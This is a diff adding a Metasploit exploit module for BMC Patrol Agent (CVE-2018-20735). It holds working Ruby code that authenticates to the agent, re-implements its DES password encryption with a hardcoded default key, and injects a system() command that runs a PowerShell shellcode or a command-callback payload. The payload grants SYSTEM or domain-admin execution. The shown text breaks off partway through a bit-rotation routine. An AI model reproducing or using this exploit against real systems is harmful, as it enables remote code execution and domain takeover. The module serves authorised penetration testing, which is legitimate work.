@@ -1,0 +1,1133 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+require 'zlib'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::Tcp
+  include Msf::Exploit::Powershell
+
+  @deflater = nil
+  @inflater = nil
+
+  SBOXES = [
+    0x20022000, 0x20000000, 0x0, 0x20022000, 0x0, 0x20022000, 0x20000000, 0x0, 0x20022000,
+    0x20022000, 0x20000000, 0x22000, 0x22000, 0x0, 0x0, 0x20000000, 0x20000000, 0x0,
+    0x22000, 0x20022000, 0x20022000, 0x20000000, 0x22000, 0x22000, 0x0, 0x22000,
+    0x20022000, 0x20000000, 0x22000, 0x22000, 0x20000000, 0x0, 0x0, 0x20022000, 0x22000,
+    0x20000000, 0x20022000, 0x20000000, 0x22000, 0x22000, 0x20000000, 0x22000,
+    0x20022000, 0x0, 0x20022000, 0x0, 0x0, 0x20000000, 0x20022000, 0x20022000, 0x20000000,
+    0x22000, 0x0, 0x22000, 0x20000000, 0x0, 0x20000000, 0x0, 0x22000, 0x20022000, 0x0,
+    0x20000000, 0x22000, 0x20022000, 0x802, 0x2, 0x8000800, 0x8000802, 0x800, 0x8000002,
+    0x8000002, 0x8000800, 0x8000002, 0x802, 0x802, 0x8000000, 0x8000800, 0x800,
+    0x0, 0x8000002, 0x2, 0x8000000, 0x800, 0x2, 0x8000802, 0x802, 0x8000000, 0x800, 0x8000000,
+    0x0, 0x2, 0x8000802, 0x0, 0x8000800, 0x8000802, 0x0, 0x0, 0x8000802, 0x800, 0x8000002,
+    0x802, 0x2, 0x8000000, 0x800, 0x8000802, 0x0, 0x2, 0x8000800, 0x8000002, 0x8000000,
+    0x8000800, 0x802, 0x8000802, 0x2, 0x802, 0x8000800, 0x800, 0x8000000, 0x8000002,
+    0x0, 0x2, 0x800, 0x8000800, 0x802, 0x8000000, 0x8000802, 0x0, 0x8000002, 0x2200004,
+    0x0, 0x2200000, 0x0, 0x4, 0x2200004, 0x2200000, 0x2200000, 0x2200000, 0x4, 0x4, 0x2200000,
+    0x4, 0x2200000, 0x0, 0x4, 0x0, 0x2200004, 0x4, 0x2200000, 0x2200004, 0x0, 0x0, 0x4, 0x2200004,
+    0x2200004, 0x2200000, 0x4, 0x0, 0x0, 0x2200004, 0x2200004, 0x4, 0x2200000, 0x2200000,
+    0x2200004, 0x2200004, 0x4, 0x4, 0x0, 0x0, 0x2200004, 0x0, 0x4, 0x2200000, 0x0, 0x2200004,
+    0x2200004, 0x2200000, 0x2200000, 0x0, 0x4, 0x4, 0x2200004, 0x2200000, 0x0, 0x4, 0x0,
+    0x2200004, 0x2200000, 0x2200004, 0x4, 0x0, 0x2200000, 0x1100004, 0x0, 0x4, 0x1100004,
+    0x1100000, 0x0, 0x1100000, 0x4, 0x0, 0x1100004, 0x0, 0x1100000, 0x4, 0x1100004, 0x1100004,
+    0x0, 0x4, 0x1100000, 0x1100004, 0x0, 0x4, 0x1100000, 0x0, 0x4, 0x1100000, 0x4, 0x1100004,
+    0x1100000, 0x1100000, 0x4, 0x0, 0x1100004, 0x4, 0x1100004, 0x1100000, 0x4, 0x1100004,
+    0x4, 0x1100000, 0x0, 0x1100000, 0x0, 0x4, 0x1100004, 0x0, 0x1100000, 0x4, 0x1100000,
+    0x1100004, 0x0, 0x0, 0x1100000, 0x0, 0x1100004, 0x4, 0x1100004, 0x1100004, 0x4, 0x0,
+    0x1100000, 0x1100000, 0x0, 0x1100004, 0x4, 0x0, 0x10000400, 0x400, 0x400, 0x10000000,
+    0x0, 0x400, 0x10000400, 0x400, 0x10000000, 0x10000000, 0x0, 0x10000400, 0x400,
+    0x0, 0x10000000, 0x0, 0x10000000, 0x10000400, 0x400, 0x400, 0x10000400, 0x10000000,
+    0x0, 0x10000000, 0x400, 0x10000400, 0x10000000, 0x10000400, 0x0, 0x0, 0x10000400,
+    0x10000400, 0x400, 0x0, 0x10000000, 0x400, 0x10000000, 0x10000000, 0x400, 0x0,
+    0x10000400, 0x10000400, 0x10000000, 0x10000000, 0x0, 0x10000400, 0x0, 0x10000400,
+    0x0, 0x0, 0x10000400, 0x10000000, 0x400, 0x400, 0x10000400, 0x400, 0x0, 0x10000000,
+    0x400, 0x0, 0x10000400, 0x400, 0x10000000, 0x4011000, 0x11001, 0x0, 0x4011000,
+    0x4000001, 0x11000, 0x4011000, 0x1, 0x11000, 0x1, 0x11001, 0x4000000, 0x4011001,
+    0x4000000, 0x4000000, 0x4011001, 0x0, 0x4000001, 0x11001, 0x0, 0x4000000, 0x4011001,
+    0x1, 0x4011000, 0x4011001, 0x11000, 0x4000001, 0x11001, 0x1, 0x0, 0x11000, 0x4000001,
+    0x11001, 0x0, 0x4000000, 0x1, 0x4000000, 0x4000001, 0x11001, 0x4011000, 0x0, 0x11001,
+    0x1, 0x4011001, 0x4000001, 0x11000, 0x4011001, 0x4000000, 0x4000001, 0x4011000,
+    0x11000, 0x4011001, 0x1, 0x11000, 0x4011000, 0x1, 0x11000, 0x0, 0x4011001, 0x4000000,
+    0x4011000, 0x4000001, 0x0, 0x11001, 0x40002, 0x40000, 0x2, 0x40002, 0x0, 0x0, 0x40002,
+    0x2, 0x40000, 0x2, 0x0, 0x40002, 0x2, 0x40002, 0x0, 0x0, 0x2, 0x40000, 0x40000, 0x2, 0x40000,
+    0x40002, 0x0, 0x40000, 0x40002, 0x0, 0x2, 0x40000, 0x40000, 0x2, 0x40002, 0x0, 0x2, 0x40002,
+    0x0, 0x2, 0x40000, 0x40000, 0x2, 0x0, 0x40002, 0x0, 0x40000, 0x2, 0x0, 0x2, 0x40000, 0x40000,
+    0x0, 0x40002, 0x40002, 0x0, 0x40002, 0x2, 0x40000, 0x40002, 0x2, 0x40000, 0x0, 0x40002,
+    0x40002, 0x0, 0x2, 0x40000, 0x20000110, 0x40000, 0x20000000, 0x20040110, 0x0, 0x40110,
+    0x20040000, 0x20000110, 0x40110, 0x20040000, 0x40000, 0x20000000, 0x20040000,
+    0x20000110, 0x110, 0x40000, 0x20040110, 0x110, 0x0, 0x20000000, 0x110, 0x20040000,
+    0x40110, 0x0, 0x20000000, 0x0, 0x20000110, 0x40110, 0x40000, 0x20040110, 0x20040110,
+    0x110, 0x20040110, 0x20000000, 0x110, 0x20040000, 0x110, 0x40000, 0x20000000,
+    0x40110, 0x20040000, 0x0, 0x0, 0x20000110, 0x0, 0x20040110, 0x40110, 0x0, 0x40000,
+    0x20040110, 0x20000110, 0x110, 0x20040110, 0x20000000, 0x40000, 0x20000110,
+    0x20000110, 0x110, 0x40110, 0x20040000, 0x20000000, 0x40000, 0x20040000, 0x40110,
+    0x0, 0x4000000, 0x11000, 0x4011008, 0x4000008, 0x11000, 0x4011008, 0x4000000,
+    0x4000000, 0x8, 0x8, 0x4011000, 0x11008, 0x4000008, 0x4011000, 0x0, 0x4011000, 0x0,
+    0x4000008, 0x11008, 0x11000, 0x4011008, 0x0, 0x8, 0x8, 0x11008, 0x4011008, 0x4000008,
+    0x4000000, 0x11000, 0x11008, 0x4011000, 0x4011000, 0x11008, 0x4000008, 0x4000000,
+    0x4000000, 0x8, 0x8, 0x11000, 0x0, 0x4011000, 0x4011008, 0x0, 0x4011008, 0x0, 0x11000,
+    0x4000008, 0x11008, 0x11000, 0x0, 0x4011008, 0x4000008, 0x4011000, 0x11008, 0x4000000,
+    0x4011000, 0x4000008, 0x11000, 0x11008, 0x8, 0x4011008, 0x4000000, 0x8, 0x22000,
+    0x0, 0x0, 0x22000, 0x22000, 0x22000, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x22000, 0x22000,
+    0x22000, 0x0, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x22000, 0x22000,
+    0x0, 0x22000, 0x0, 0x0, 0x22000, 0x22000, 0x22000, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x22000,
+    0x22000, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x0, 0x0, 0x22000, 0x22000,
+    0x22000, 0x0, 0x0, 0x0, 0x22000, 0x22000, 0x0, 0x0, 0x0, 0x22000, 0x22000, 0x110, 0x110,
+    0x0, 0x80000, 0x110, 0x80000, 0x80110, 0x0, 0x80110, 0x80110, 0x80000, 0x0, 0x80000,
+    0x110, 0x0, 0x80110, 0x0, 0x80110, 0x110, 0x0, 0x80000, 0x110, 0x80000, 0x110, 0x80110,
+    0x0, 0x0, 0x80110, 0x110, 0x80000, 0x80110, 0x80000, 0x80110, 0x0, 0x80000, 0x80110,
+    0x80000, 0x110, 0x0, 0x80000, 0x0, 0x80000, 0x110, 0x0, 0x110, 0x80110, 0x80000, 0x110,
+    0x80110, 0x80000, 0x0, 0x80110, 0x110, 0x0, 0x80110, 0x0, 0x80000, 0x110, 0x80110,
+    0x80000, 0x0, 0x80110, 0x110, 0x110, 0x2200000, 0x8, 0x0, 0x2200008, 0x8, 0x0, 0x2200000,
+    0x8, 0x0, 0x2200008, 0x8, 0x2200000, 0x2200000, 0x2200000, 0x2200008, 0x8, 0x8, 0x2200000,
+    0x2200008, 0x0, 0x0, 0x0, 0x2200008, 0x2200008, 0x2200008, 0x2200008, 0x2200000,
+    0x0, 0x0, 0x8, 0x8, 0x2200000, 0x0, 0x2200000, 0x2200000, 0x8, 0x2200008, 0x8, 0x0, 0x2200000,
+    0x2200000, 0x0, 0x2200008, 0x8, 0x8, 0x2200008, 0x8, 0x0, 0x2200008, 0x8, 0x8, 0x2200000,
+    0x2200000, 0x2200008, 0x8, 0x0, 0x0, 0x2200000, 0x2200000, 0x2200008, 0x2200008,
+    0x0, 0x0, 0x2200008, 0x1100000, 0x800, 0x800, 0x1, 0x1100801, 0x1100001, 0x1100800,
+    0x0, 0x0, 0x801, 0x801, 0x1100000, 0x1, 0x1100800, 0x1100000, 0x801, 0x801, 0x1100000,
+    0x1100001, 0x1100801, 0x0, 0x800, 0x1, 0x1100800, 0x1100001, 0x1100801, 0x1100800,
+    0x1, 0x1100801, 0x1100001, 0x800, 0x0, 0x1100801, 0x1100000, 0x1100001, 0x801,
+    0x1100000, 0x800, 0x0, 0x1100001, 0x801, 0x1100801, 0x1100800, 0x0, 0x800, 0x1, 0x1,
+    0x800, 0x0, 0x801, 0x800, 0x1100800, 0x801, 0x1100000, 0x1100801, 0x0, 0x1100800,
+    0x1, 0x1100001, 0x1100801, 0x1, 0x1100800, 0x1100000, 0x1100001, 0x0, 0x0, 0x400,
+    0x10000400, 0x10000400, 0x10000000, 0x0, 0x0, 0x400, 0x10000400, 0x10000000, 0x400,
+    0x10000000, 0x400, 0x400, 0x10000000, 0x10000400, 0x0, 0x10000000, 0x10000400,
+    0x0, 0x400, 0x10000400, 0x0, 0x10000400, 0x10000000, 0x400, 0x10000000, 0x10000000,
+    0x10000400, 0x0, 0x400, 0x10000000, 0x400, 0x10000400, 0x10000000, 0x0, 0x0, 0x400,
+    0x10000400, 0x10000400, 0x10000000, 0x0, 0x0, 0x0, 0x10000400, 0x10000000, 0x400,
+    0x0, 0x10000400, 0x400, 0x0, 0x10000000, 0x0, 0x10000400, 0x400, 0x400, 0x10000000,
+    0x10000000, 0x10000400, 0x10000400, 0x400, 0x400, 0x10000000, 0x220, 0x8000000,
+    0x8000220, 0x0, 0x8000000, 0x220, 0x0, 0x8000220, 0x220, 0x0, 0x8000000, 0x8000220,
+    0x8000220, 0x8000220, 0x220, 0x0, 0x8000000, 0x8000220, 0x220, 0x8000000, 0x8000220,
+    0x220, 0x0, 0x8000000, 0x0, 0x0, 0x8000220, 0x220, 0x0, 0x8000000, 0x8000000, 0x220,
+    0x0, 0x8000000, 0x220, 0x8000220, 0x8000220, 0x0, 0x0, 0x8000000, 0x220, 0x8000220,
+    0x8000000, 0x220, 0x8000000, 0x220, 0x220, 0x8000000, 0x8000220, 0x0, 0x0, 0x220,
+    0x8000000, 0x8000220, 0x8000220, 0x0, 0x220, 0x8000000, 0x8000220, 0x0, 0x0, 0x220,
+    0x8000000, 0x8000220, 0x80220, 0x80220, 0x0, 0x0, 0x80000, 0x220, 0x80220, 0x80220,
+    0x0, 0x80000, 0x220, 0x0, 0x220, 0x80000, 0x80000, 0x80220, 0x0, 0x220, 0x220, 0x80000,
+    0x80220, 0x80000, 0x0, 0x220, 0x80000, 0x220, 0x80000, 0x80220, 0x220, 0x0, 0x80220,
+    0x0, 0x220, 0x0, 0x80000, 0x80220, 0x0, 0x80000, 0x0, 0x220, 0x80220, 0x80000, 0x80000,
+    0x220, 0x80220, 0x0, 0x220, 0x80000, 0x80220, 0x220, 0x80220, 0x80000, 0x220, 0x0,
+    0x80000, 0x80220, 0x0, 0x80220, 0x220, 0x0, 0x80000, 0x80220, 0x0, 0x220
+  ].freeze
+
+  PC1 = "\x38\x30\x28\x20\x18\x10\x8\x0\x39\x31\x29\x21\x19\x11\x9"\
+  "\x1\x3A\x32\x2A\x22\x1A\x12\x0A\x2\x3B\x33\x2B\x23\x3E\x36"\
+  "\x2E\x26\x1E\x16\x0E\x6\x3D\x35\x2D\x25\x1D\x15\x0D\x5\x3C"\
+  "\x34\x2C\x24\x1C\x14\x0C\x4\x1B\x13\x0B\x3\x0\x0\x0\x0\x0\x0\x0\x0".freeze
+
+  PC2 = "\x0D\x10\x0A\x17\x0\x4\x2\x1B\x0E\x5\x14\x9\x16\x12\x0B\x3"\
+  "\x19\x7\x0F\x6\x1A\x13\x0C\x1\x28\x33\x1E\x24\x2E\x36\x1D"\
+  "\x27\x32\x2C\x20\x2F\x2B\x30\x26\x37\x21\x34\x2D\x29\x31"\
+  "\x23\x1C\x1F".freeze
+
+  SBOX_BYTE_ORDER = [
+    1, 2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0x100, 0x200, 0x400, 0x800, 0x1000, 0x2000,
+    0x4000, 0x8000, 0x10000, 0x20000, 0x40000, 0x80000, 0x100000, 0x200000, 0x400000,
+    0x800000, 0x1000000, 0x2000000, 0x4000000, 0x8000000, 0x10000000, 0x20000000,
+    0x40000000, 0x80000000
+  ].freeze
+
+  ROTATIONS = "\x1\x1\x2\x2\x2\x2\x2\x2\x1\x2\x2\x2\x2\x2\x2\x1".freeze
+  INIT_DES_KEY_0 = "\x9a\xd3\xbc\x24\x10\xe2\x8f\x0e".freeze
+  INIT_DES_KEY_1 = "\xe2\x95\x14\x33\x59\xc3\xec\xa8".freeze
+
+  DES_ENCRYPT = 0
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'BMC Patrol Agent Privilege Escalation Cmd Execution',
+      'Description'    => %q(
+        This module leverages the remote command execution feature provided by
+        the BMC Patrol Agent software. It can also be used to escalate privileges
+        on Windows hosts as the software runs as SYSTEM but only verfies that the password
+        of the provided user is correct. This also means if the software is running on a
+        domain controller, it can be used to escalate from a normal domain user to domain
+        admin as SYSTEM on a DC is DA. **WARNING** The windows version of this exploit uses
+        powershell to execute the payload. The powershell version tends to timeout on
+        the first run so it may take multiple tries.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'b0yd' # @rwincey / Vulnerability Discovery and MSF module author
+        ],
+      'References'     =>
+        [
+          ['CVE', '2018-20735'],
+          ['URL', 'https://www.securifera.com/blog/2018/12/17/bmc-patrol-agent-domain-user-to-domain-admin/']
+        ],
+      'Platform'       => ['win', 'linux'],
+      'Targets'        =>
+        [
+          [
+            'Windows Powershell Injected Shellcode', {
+              'Platform' => 'win'
+            }
+          ],
+          [
+            'Generic Command Callback', {
+              'Arch' => ARCH_CMD,
+              'Platform' => %w[linux unix win]
+            }
+          ]
+        ],
+      'Privileged'     => true,
+      'DefaultTarget'  => 0,
+      'DefaultOptions' => {
+        'DisablePayloadHandler' => true
+      },
+      'DisclosureDate' => 'Jan 17 2019'))
+
+    register_options(
+      [
+        Opt::RPORT(3181),
+        OptString.new('USER',     [true,  'local or domain user to authenticate with patrol', 'patrol']),
+        OptString.new('PASSWORD', [true,  'password to authenticate with patrol', 'password']),
+        OptString.new('CMD',      [false, 'command to run on the target. If this option is specified the payload will be ignored.'])
+      ]
+    )
+
+  end
+
+  def cleanup
+    disconnect
+    print_status("Disconnected from BMC Patrol Agent.")
+    @inflater.close
+    @deflater.close
+    super
+  end
+
+  def get_target_os(srv_info_msg)
+    lines = srv_info_msg.split("\n")
+    fail_with(Failure::UnexpectedReply, "Invalid server info msg.") if lines[0] != "MS" && lines[1] != "{" && lines[-1] != "}"
+
+    os = nil
+    ver = nil
+    lines[2..-2].each do |i|
+      val = i.split("=")
+      if val.length == 2
+        if val[0].strip! == "T"
+          os = val[1]
+        elsif val[0].strip! == "VER"
+          ver = val[1]
+        end
+      end
+    end
+    [os, ver]
+  end
+
+  def get_cmd_output(cmd_output_msg)
+
+    lines = cmd_output_msg.split("\n")
+    fail_with(Failure::UnexpectedReply, "Invalid command output msg.") if lines[0] != "PEM_MSG" && lines[1] != "{" && lines[-1] != "}"
+
+    # Parse out command results
+    idx_start = cmd_output_msg.index("Result\x00")
+    idx_end = cmd_output_msg.index("RemPsl_user")
+    output = cmd_output_msg[idx_start + 7..idx_end - 1]
+
+    output
+  end
+
+  def exploit
+
+    # Manually start the handler if not running a single command
+    if datastore['CMD'].nil? || datastore['CMD'].empty?
+
+      # Set to nil if the cmd is empty for checks further down
+      datastore['CMD'] = nil
+      datastore['DisablePayloadHandler'] = false
+
+      # Configure the payload handler
+      payload_instance.exploit_config = {
+        'active_timeout' => 300
+      }
+      # Setup the payload handler
+      payload_instance.setup_handler
+
+      # Start the payload handler
+      payload_instance.start_handler
+
+    end
+
+    # Initialize zlib objects
+    @deflater = Zlib::Deflate.new(4, 15, Zlib::MAX_MEM_LEVEL, Zlib::DEFAULT_STRATEGY)
+    @inflater = Zlib::Inflate.new
+
+    # Connect to the BMC Patrol Agent
+    connect
+    print_status("Connected to BMC Patrol Agent.")
+
+    # Create session msg
+    create_session
+    ret_data = receive_msg
+    fail_with(Failure::UnexpectedReply, "Failed to receive session confirmation. Aborting.") if ret_data.nil?
+
+    # Authenticate
+    authenticate_user(datastore['USER'], datastore['PASSWORD'])
+
+    # Receive the authentication response
+    ret_data = receive_msg
+    fail_with(Failure::UnexpectedReply, "Failed to receive authentication response. Aborting.") if ret_data.nil?
+
+    ret_msg = process_response(ret_data)
+    if ret_msg =~ /logged in/
+      print_status("Successfully authenticated user.")
+    else
+      fail_with(Failure::UnexpectedReply, "Login failed. Aborting.")
+    end
+
+    # Receive the server info
+    ret_data = receive_msg
+    fail_with(Failure::UnexpectedReply, "Failed to receive server info msg. Aborting.") if ret_data.nil?
+    srv_info = process_response(ret_data)
+
+    # Get the target's OS from their info msg
+    target_os = get_target_os(srv_info)
+
+    # When using autotargeting, MSF selects the Windows meterpreter as the default payload.
+    # Fail if this is the case and ask the user to select an appropriate payload.
+    if target_os[0] == 'Linux' && payload_instance.name =~ /Windows/ && datastore['CMD'].nil?
+      fail_with(Failure::BadConfig, "#{peer} - Select a compatible payload for this Linux target.")
+    end
+
+    target_name = target.name
+    if !datastore['CMD'].nil?
+      command = datastore['CMD'].tr('"', '\"')
+      print_status("Command to execute: #{command}")
+    elsif target_name == 'Windows Powershell Injected Shellcode'
+      # Get encoded powershell of payload
+      command = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, method: 'reflection')
+    else
+      command = payload.raw.tr('"', '\"')
+    end
+
+    # Run command
+    run_cmd(command)
+
+    # Receive command confirmation
+    ret_data = receive_msg
+    if !ret_data.nil?
+      process_response(ret_data)
+    end
+
+    # Receive command output
+    ret_data = receive_msg
+    if !ret_data.nil? && !datastore['CMD'].nil?
+      cmd_result_data = process_response(ret_data)
+      cmd_result = get_cmd_output(cmd_result_data)
+      print_status("Output:\n#{cmd_result}")
+    end
+
+    # Handle the shell
+    handler
+
+  end
+
+  def receive_msg
+
+    header = sock.get_once(6)
+    if header.nil?
+      return
+    end
+
+    payload_size_arr = header[0, 4]
+    payload_size = payload_size_arr.unpack1("N")
+    payload = ''
+    if payload_size > 0
+      payload = sock.get_once(payload_size)
+      if payload.nil?
+        return
+      end
+    end
+
+    return header + payload
+
+  end
+
+  def send_msg(type, compression, data)
+
+    data_len = data.length
+    buf = [data_len].pack('N')
+
+    # Set the type
+    buf += [type].pack('C')
+
+    # Set compression flag
+    buf += [compression].pack('C')
+
+    # Add data
+    buf += data
+
+    # Send msg
+    sock.put(buf)
+
+  end
+
+  def process_response(ret_data)
+
+    # While style checks complain, I intend to leave this parsing
+    # in place for debugging purposes
+    ret_size_arr = ret_data[0, 4]
+    ret_size = ret_size_arr.unpack1("N") # rubocop:disable Lint/UselessAssignment
+
+    msg_type = ret_data[4, 1] # rubocop:disable Lint/UselessAssignment
+    comp_flag = ret_data[5, 1]
+
+    payload_data = ret_data[6..-1]
+    if comp_flag == "\x00"
+      bin_data = payload_data.unpack1("H*") # rubocop:disable Lint/UselessAssignment
+      payload_data = @inflater.inflate(payload_data)
+    end
+
+    return payload_data
+
+  end
+
+  def run_cmd(cmd)
+
+    user_num = rand 1000..9999
+    msg_1 = %(R_E
+{
+\tRE_ID=1
+\tRE_PDESC=0\tRemPsl\tsystem("#{cmd}");\tRemPsl_user_#{user_num}
+\tRE_ORG=PemApi
+\tRE_SEV=1
+\tRE_NSEV=5
+\tRE_ST=
+}
+)
+
+    msg_1 += "\x00"
+    # Compress the message
+    comp_data = @deflater.deflate msg_1, Zlib::SYNC_FLUSH
+    send_msg(0x44, 0x0, comp_data)
+
+  end
+
+  def identify(user)
+
+    inner_len = 15
+    msg_type = 8
+    len_str = [inner_len].pack("N")
+    msg_str = [msg_type].pack("N")
+    msg_1 = %(PEM_MSG
+{
+\tNSDL=#{inner_len}
+\tPEM_DGRAM=#{len_str}#{msg_str}#{user}\x00
+}
+)
+    msg_1 += "\x00"
+    print_status("Msg: #{msg_1}")
+    bin_data = msg_1.unpack1("H*") # rubocop:disable Lint/UselessAssignment
+    # Compress the message
+    comp_data = @deflater.deflate msg_1, Zlib::SYNC_FLUSH
+    send_msg(0x44, 0x0, comp_data)
+
+  end
+
+  def create_session
+    sess_msg = "\x00\x00\x00\x00\x00\x00\x00\x00\x05\x02\x00\x04\x02\x04\x03\x10\x00\x00\x03\x04\x00\x00\x00\x00\x01\x01\x04\x00\xff\x00\x00\x00"
+    sess_msg += "\x00" * 0x68
+    send_msg(0x45, 0x2, sess_msg)
+  end
+
+  def authenticate_user(user, password)
+    # Default encryption key
+    enc_key = 'k$C4}@"_'
+    output_data = des_crypt_func(password, enc_key, DES_ENCRYPT)
+    # Convert to hex string
+    encrpted_pw = output_data.unpack1("H*")
+    des_pw = encrpted_pw.upcase
+
+    msg_1 = %(ID
+{
+\tHOST=user
+\tUSER=#{user}
+\tPASS=#{des_pw}
+\tVER=V9.6.00
+\tT=PEMAPI
+\tHTBT=1
+\tTMOT=1728000
+\tRTRS=3
+}
+)
+
+    msg_1 += "\x00"
+    comp_data = @deflater.deflate msg_1, Zlib::SYNC_FLUSH
+    send_msg(0x44, 0x0, comp_data)
+
+  end
+
+  def rotate_block_init(input_block_tuple)
+
+    v6 = 0
+    v5 = 0
+    input_block_tuple = input_block_tuple.pack("V*").unpack("i*")
+    v3 = input_block_tuple[0]
+    v4 = input_block_tuple[1]
+
+    if (v4 & 0x2000000) != 0
+      v5 = 1
+    end
+    if (v4 & 0x20000) != 0
+      v5 |= 2
+    end
+    if (v4 & 0x200) != 0
+      v5 |= 4
+    end
+    if (v4 & 2) != 0
+      v5 |= 8
+    end
+    if (v3 & 0x2000000) != 0
+      v5 |= 0x10
+    end
+    if (v3 & 0x20000) != 0
+      v5 |= 0x20
+    end
+    if (v3 & 0x200) != 0
+      v5 |= 0x40
+    end
+    if (v3 & 2) != 0
+      v5 |= 0x80
+    end
+    if (v4 & 0x8000000) != 0
+      v5 |= 0x100
+    end
+    if (v4 & 0x80000) != 0
+      v5 |= 0x200
+    end
+    if (v4 & 0x800) != 0
+      v5 |= 0x400
+    end
+    if (v4 & 8) != 0
+      v5 |= 0x800
+    end
+    if (v3 & 0x8000000) != 0
+      v5 |= 0x1000
+    end
+    if (v3 & 0x80000) != 0
+      v5 |= 0x2000
+    end
+    if (v3 & 0x800) != 0
+      v5 |= 0x4000
+    end
+    if (v3 & 8) != 0
+      v5 |= 0x8000
+    end
+    if (v4 & 0x20000000) != 0
+      v5 |= 0x10000
+    end
+    if (v4 & 0x200000) != 0
+      v5 |= 0x20000
+    end
+    if (v4 & 0x2000) != 0
+      v5 |= 0x40000
+    end
+    if (v4 & 0x20) != 0
+      v5 |= 0x80000
+    end
+    if (v3 & 0x20000000) != 0
+      v5 |= 0x100000
+    end
+    if (v3 & 0x200000) != 0
+      v5 |= 0x200000
+    end
+    if (v3 & 0x2000) != 0
+      v5 |= 0x400000
+    end
+    if (v3 & 0x20) != 0
+      v5 |= 0x800000
+    end
+    if (v4 < 0)
+      v5 |= 0x1000000
+    end
+    if (v4 & 0x800000) != 0
+      v5 |= 0x2000000
+    end
+    if (v4 & 0x8000) != 0
+      v5 |= 0x4000000
+    end
+    if (v4 & 0x80) != 0
+      v5 |= 0x8000000
+    end
+    if (v3 < 0)
+      v5 |= 0x10000000
+    end
+    if (v3 & 0x800000) != 0
+      v5 |= 0x20000000
+    end
+    if (v3 & 0x8000) != 0
+      v5 |= 0x40000000
+    end
+    if (v3 & 0x80) != 0
+      v5 |= 0x80000000
+    end
+    if (v4 & 0x1000000) != 0
+      v6 = 1
+    end
+    if (v4 & 0x10000) != 0
+      v6 |= 2
+    end
+    if (v4 & 0x100) != 0
+      v6 |= 4
+    end
+    if (v4 & 1) != 0
+      v6 |= 8
+    end
+    if (v3 & 0x1000000) != 0
+      v6 |= 0x10
+    end
+    if (v3 & 0x10000) != 0
+      v6 |= 0x20
+    end
+    if (v3 & 0x100) != 0
+      v6 |= 0x40
+    end
+    if (v3 & 1) != 0
+      v6 |= 0x80
+    end
+    if (v4 & 0x4000000) != 0
+      v6 |= 0x100
+    end
+    if (v4 & 0x40000) != 0
+      v6 |= 0x200
+    end
+    if (v4 & 0x400) != 0
+      v6 |= 0x400
+    end
+    if (v4 & 4) != 0
+      v6 |= 0x800
+    end
+    if (v3 & 0x4000000) != 0
+      v6 |= 0x1000
+    end
+    if (v3 & 0x40000) != 0
+      v6 |= 0x2000
+    end
+    if (v3 & 0x400) != 0
+      v6 |= 0x4000
+    end
+    if (v3 & 4) != 0
+      v6 |= 0x8000
+    end
+    if (v4 & 0x10000000) != 0
+      v6 |= 0x10000
+    end
+    if (v4 & 0x100000) != 0
+      v6 |= 0x20000
+    end
+    if (v4 & 0x1000) != 0
+      v6 |= 0x40000
+    end
+    if (v4 & 0x10) != 0
+      v6 |= 0x80000
+    end
+    if (v3 & 0x10000000) != 0
+      v6 |= 0x100000
+    end
+    if (v3 & 0x100000) != 0
+      v6 |= 0x200000
+    end
+    if (v3 & 0x1000) != 0
+      v6 |= 0x400000
+    end
+    if (v3 & 0x10) != 0
+      v6 |= 0x800000
+    end
+    if (v4 & 0x40000000) != 0
+      v6 |= 0x1000000
+    end
+    if (v4 & 0x400000) != 0
+      v6 |= 0x2000000
+    end
+    if (v4 & 0x4000) != 0
+      v6 |= 0x4000000
+    end
+    if (v4 & 0x40) != 0
+      v6 |= 0x8000000
+    end
+    if (v3 & 0x40000000) != 0
+      v6 |= 0x10000000
+    end
+    if (v3 & 0x400000) != 0
+      v6 |= 0x20000000
+    end
+    if (v3 & 0x4000) != 0
+      v6 |= 0x40000000
+    end
+    if (v3 & 0x40) != 0
+      v6 |= 0x80000000
+    end
+
+    # Create return tuple
+    ret_block = Array.new
+    ret_block.push v5
+    ret_block.push v6
+    ret_block
+  end
+
+  def rotate_block_final(input_block_tuple)
+
+    v6 = 0
+    v5 = 0
+    input_block_tuple = input_block_tuple.pack("V*").unpack("i*")
+    v3 = input_block_tuple[0]
+    v4 = input_block_tuple[1]
+
+    if (v4 & 0x80) != 0
+      v5 = 1
+    end
+    if (v3 & 0x80) != 0
+      v5 |= 2
+    end
+    if (v4 & 0x8000) != 0
+      v5 |= 4
+    end
+    if (v3 & 0x8000) != 0
+      v5 |= 8
+    end
+    if (v4 & 0x800000) != 0
+      v5 |= 0x10
+    end
+    if (v3 & 0x800000) != 0
+      v5 |= 0x20
+    end
+    if (v4 < 0)
+      v5 |= 0x40
+    end
+    if (v3 < 0)
+      v5 |= 0x80
+    end
+    if (v4 & 0x40) != 0
+      v5 |= 0x100
+    end
+    if (v3 & 0x40) != 0
+      v5 |= 0x200
+    end
+    if (v4 & 0x4000) != 0
+      v5 |= 0x400
+    end
+    if (v3 & 0x4000) != 0
+      v5 |= 0x800
+    end
+    if (v4 & 0x400000) != 0
+      v5 |= 0x1000
+    end
+    if (v3 & 0x400000) != 0
+      v5 |= 0x2000
+    end
+    if (v4 & 0x40000000) != 0
+      v5 |= 0x4000
+    end
+    if (v3 & 0x40000000) != 0
+      v5 |= 0x8000
+    end
+    if (v4 & 0x20) != 0
+      v5 |= 0x10000
+    end
+    if (v3 & 0x20) != 0
+      v5 |= 0x20000
+    end
+    if (v4 & 0x2000) != 0
+      v5 |= 0x40000
+    end
+    if (v3 & 0x2000) != 0
+      v5 |= 0x80000
+    end
+    if (v4 & 0x200000) != 0
+      v5 |= 0x100000
+    end
+    if (v3 & 0x200000) != 0
+      v5 |= 0x200000
+    end
+    if (v4 & 0x20000000) != 0
+      v5 |= 0x400000
+    end
+    if (v3 & 0x20000000) != 0
+      v5 |= 0x800000
+    end
+    if (v4 & 0x10) != 0
+      v5 |= 0x1000000
+    end
+    if (v3 & 0x10) != 0
+      v5 |= 0x2000000
+    end
